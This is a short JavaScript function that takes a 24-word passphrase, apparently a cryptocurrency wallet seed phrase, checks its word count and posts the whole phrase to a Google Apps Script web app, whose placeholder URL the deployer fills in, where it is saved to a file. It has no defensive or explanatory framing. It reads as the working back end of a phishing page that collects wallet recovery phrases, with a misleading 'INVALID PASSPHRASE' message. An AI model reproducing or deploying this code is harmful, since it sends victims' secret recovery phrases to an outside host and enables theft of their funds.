function validateAndSendPassphrase(passphrase) {
    // Trim and split into words
    const words = passphrase.trim().split(/\s+/);

    // Validate passphrase (must be 24 words)
    if (words.length !== 24) {
        console.log("INVALID PASSPHRASE");
        return;
    }

    // Your Google Apps Script URL
    const url = "YOUR_DEPLOYED_WEB_APP_URL_HERE"; 

    // Send data to Google Apps Script
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ passphrase: passphrase })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log("Passphrase saved successfully! File URL: " + data.fileUrl);
        } else {
            console.log("INVALID PASSPHRASE");
        }
    })
    .catch(error => {
        console.error("Error:", error);
    });
}

// Example Usage:
const myPassphrase = "word1 word2 word3 ... word24"; // Replace with your actual passphrase
validateAndSendPassphrase(myPassphrase);

